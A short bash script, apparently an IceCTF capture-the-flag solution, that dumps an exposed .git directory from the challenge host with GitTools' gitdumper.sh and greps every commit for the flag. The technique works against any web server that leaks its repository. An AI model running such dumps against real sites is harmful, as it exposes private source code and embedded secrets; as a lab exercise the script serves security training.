#!/bin/bash


rm -rf the_repo
/home/john/cyber/tools/GitTools/Dumper/gitdumper.sh http://exposed.vuln.icec.tf/.git/ the_repo

cd the_repo

git log|grep "^commit"|cut -d " " -f2|while read line; do git show $line; done|grep "IceCTF" |tail -n 1|grep -o "IceCTF{.*}"
cd ..
